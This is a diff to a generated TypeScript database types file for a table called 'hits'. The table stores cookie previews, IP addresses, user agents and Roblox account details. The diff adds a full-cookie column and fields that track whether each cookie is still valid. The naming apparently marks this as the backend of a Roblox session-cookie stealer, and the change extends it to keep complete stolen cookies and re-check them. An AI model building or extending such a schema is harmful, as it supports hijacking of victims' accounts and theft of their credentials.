@@ -16,10 +16,13 @@ export type Database = {
     Tables: {
       hits: {
         Row: {
+          cookie_full: string | null
           cookie_preview: string | null
           created_at: string
           id: string
           ip_address: string | null
+          is_valid: boolean | null
+          last_checked_at: string | null
           owner_id: string
           roblox_age_verified: boolean | null
           roblox_gamepass_earnings: number | null
@@ -38,10 +41,13 @@ export type Database = {
           user_agent: string | null
         }
         Insert: {
+          cookie_full?: string | null
           cookie_preview?: string | null
           created_at?: string
           id?: string
           ip_address?: string | null
+          is_valid?: boolean | null
+          last_checked_at?: string | null
           owner_id: string
           roblox_age_verified?: boolean | null
           roblox_gamepass_earnings?: number | null
@@ -60,10 +66,13 @@ export type Database = {
           user_agent?: string | null
         }
         Update: {
+          cookie_full?: string | null
           cookie_preview?: string | null
           created_at?: string
           id?: string
           ip_address?: string | null
+          is_valid?: boolean | null
+          last_checked_at?: string | null
           owner_id?: string
           roblox_age_verified?: boolean | null
           roblox_gamepass_earnings?: number | null
